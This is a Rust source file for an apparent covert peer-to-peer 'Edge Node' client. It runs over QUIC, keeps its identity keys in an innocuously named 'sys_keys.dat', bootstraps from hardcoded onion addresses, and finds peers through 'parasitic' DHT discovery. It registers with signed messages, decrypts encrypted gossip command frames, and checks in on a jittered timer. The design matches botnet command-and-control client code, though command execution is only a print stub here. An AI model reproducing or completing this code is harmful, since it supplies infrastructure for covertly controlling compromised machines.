use std::time::Duration;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time;
use lru::LruCache;
use std::num::NonZeroUsize;
use protocol::{MeshMsg, PeerInfo, GhostPacket, CommandPayload, GossipMsg, Registration};
use protocol::quic::PhantomFrame;
use crate::config::crypto::load_or_generate_keys;
use crate::helpers::paths::get_appdata_dir;
use crate::p2p::transport::{QuicPool, make_client_config};
use crate::p2p::dht::{RoutingTable, InsertResult};
use rand::seq::SliceRandom;
use futures::stream::StreamExt;
use quinn::{Endpoint, ServerConfig};

struct MeshState {
    dht: RoutingTable,
    pool: QuicPool,
    seen_messages: LruCache<String, i64>,
    my_address: String,
    keypair: ed25519_dalek::SigningKey,
}

pub async fn start_client(bootstrap_override: Option<String>) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", "Starting Edge Node (Phantom QUIC - UDP)...");

    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);
    let my_pub_hex = identity.pub_hex.clone();

    let (endpoint, _) = make_server_endpoint("0.0.0.0:0".parse()?)?;
    let local_port = endpoint.local_addr()?.port();
    
    let public_ip = get_public_ip().await.unwrap_or_else(|| "127.0.0.1".to_string());
    let my_address = format!("{}:{}", public_ip, local_port);
    println!("{}: {}", "Edge QUIC Listening on", my_address);
    
    let mut client_endpoint = endpoint.clone();
    client_endpoint.set_default_client_config(make_client_config());

    let state = Arc::new(RwLock::new(MeshState {
        dht: RoutingTable::new(&my_address),
        pool: QuicPool::new(client_endpoint),
        seen_messages: LruCache::new(NonZeroUsize::new(1000).unwrap()),
        my_address: my_address.clone(),
        keypair: identity.keypair.clone(),
    }));

    use crate::config::constants::BOOTSTRAP_ONIONS;
    let mut peers: Vec<String> = if let Some(p) = bootstrap_override {
        vec![p]
    } else {
        BOOTSTRAP_ONIONS.iter().map(|s| s.to_string()).collect()
    };
    
    // 5. Parasitic Peer Discovery (Edge Role)
    use crate::discovery::parasitic::ParasiticDiscovery;
    let discovery = ParasiticDiscovery::new();
    match discovery.edge_role_find_peers().await {
        Ok(found_peers) => {
             for peer in found_peers {
                 // Convert SocketAddr to String (simplification, real logic might need onion conversion or direct IP usage)
                 // Note: DHT returns IP:Port. Mesh Nodes listening on QUIC IP:Port.
                 peers.push(peer.to_string());
             }
        }
        Err(e) => eprintln!("DHT Discovery Error: {}", e),
    }

    for bootstrap_addr in peers.iter() {
         println!("Attempting to register with: {}", bootstrap_addr);
         match register_node(&state, bootstrap_addr, &my_pub_hex, &my_address, &identity.keypair).await {
             Ok(_) => println!("Registration sent to {}", bootstrap_addr),
             Err(e) => println!("Registration failed to {}: {}", bootstrap_addr, e),
         }
    }
    
    let state_clone = state.clone();

    tokio::spawn(async move {
        while let Some(conn) = endpoint.accept().await {
            let s_inner = state_clone.clone();
            tokio::spawn(async move {
                if let Ok(connection) = conn.await {
                     handle_connection(connection, s_inner).await;
                }
            });
        }
    });

    let state_maint = state.clone();
    let me = my_address.clone();
    tokio::spawn(async move {
        loop {
            let sleep_time = 60 + (rand::random::<u64>() % 20); 
            time::sleep(Duration::from_secs(sleep_time)).await;
            perform_lookup(&state_maint, &me).await;
        }
    });

    loop {
        time::sleep(Duration::from_secs(3600)).await;
    }
}

async fn handle_connection(conn: quinn::Connection, state: Arc<RwLock<MeshState>>) {
    while let Ok(mut stream) = conn.accept_uni().await {
        let s_inner = state.clone();
        tokio::spawn(async move {
             if let Ok(bytes) = stream.read_to_end(1024 * 64).await {
                 if let Some(frame) = PhantomFrame::from_bytes(&bytes) {
                     handle_frame(s_inner, frame).await;
                 }
             }
        });
    }
}

async fn handle_frame(_state: Arc<RwLock<MeshState>>, frame: PhantomFrame) {
    // Decrypt Payload using ChaCha20Poly1305
    let plaintext = match protocol::crypto::decrypt_payload(&frame.noise_payload) {
        Ok(p) => p,
        Err(_) => return,
    };


    if let Ok(msg_str) = String::from_utf8(plaintext) {
         if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&msg_str) {
             match mesh_msg {
                 MeshMsg::Gossip(gossip) => process_gossip_cmd(gossip),
                 _ => {}
             }
         }
    }
}

fn process_gossip_cmd(msg: GossipMsg) {
    println!("Received Gossip via QUIC. ID: {}", msg.id);
}

fn make_server_endpoint(bind_addr: std::net::SocketAddr) -> Result<(Endpoint, Vec<u8>), Box<dyn std::error::Error>> {
    let cert_key = rcgen::generate_simple_self_signed(vec!["localhost".into()])?;
    let cert_der = cert_key.cert.der().to_vec();
    // Fixed key access
    let key_der = cert_key.signing_key.serialize_der();
    
    let cert_chain = vec![rustls::pki_types::CertificateDer::from(cert_der.clone())];
    let priv_key = rustls::pki_types::PrivateKeyDer::Pkcs8(rustls::pki_types::PrivatePkcs8KeyDer::from(key_der));

    let provider = rustls::crypto::ring::default_provider();
    let server_crypto = rustls::ServerConfig::builder_with_provider(provider.into())
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_no_client_auth()
        .with_single_cert(cert_chain, priv_key)?;

    let mut server_config = ServerConfig::with_crypto(Arc::new(
        quinn::crypto::rustls::QuicServerConfig::try_from(server_crypto)?
    ));
    let transport_config = std::sync::Arc::get_mut(&mut server_config.transport).unwrap();
    transport_config.max_concurrent_uni_streams(100_u8.into());
    
    let endpoint = Endpoint::server(server_config, bind_addr)?;
    Ok((endpoint, cert_der))
}

async fn register_node(state: &Arc<RwLock<MeshState>>, bootstrap_addr: &str, my_pub: &str, my_address: &str, signing_key: &ed25519_dalek::SigningKey) -> Result<(), Box<dyn std::error::Error>> {
    let sig_data = format!("Register:{}", my_address);
    use ed25519_dalek::Signer;
    let signature = hex::encode(signing_key.sign(sig_data.as_bytes()).to_bytes());
    
    let reg = Registration {
        pub_key: my_pub.to_string(),
        onion_address: my_address.to_string(),
        signature,
        pow_nonce: 0,
        timestamp: chrono::Utc::now().timestamp(),
    };
    
    let msg = MeshMsg::Register(reg);
    let msg_bytes = serde_json::to_vec(&msg)?;
    let transport_sig = protocol::crypto::sign_payload(signing_key, &msg_bytes);
    
    let mut guard = state.write().await;
    guard.pool.send_msg(bootstrap_addr, msg_bytes, 1, transport_sig, &[]).await.map_err(|e| e.into())
}

async fn get_public_ip() -> Option<String> { Some("127.0.0.1".to_string()) }
async fn perform_lookup(_: &Arc<RwLock<MeshState>>, _: &str) {}
